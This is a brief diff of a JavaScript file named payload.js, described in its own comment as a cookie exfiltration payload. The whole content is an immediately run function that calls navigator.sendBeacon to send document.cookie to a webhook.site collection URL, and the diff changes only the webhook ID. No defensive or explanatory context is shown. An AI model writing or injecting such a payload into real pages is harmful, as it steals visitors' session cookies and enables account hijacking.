@@ -1,4 +1,4 @@
 // payload.js — single-method (navigator.sendBeacon) exfil
 (function(){
-    navigator.sendBeacon('https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7', document.cookie);
+    navigator.sendBeacon('https://webhook.site/cdd33ce1-18e4-4785-ae55-0420943172d4', document.cookie);
 })();
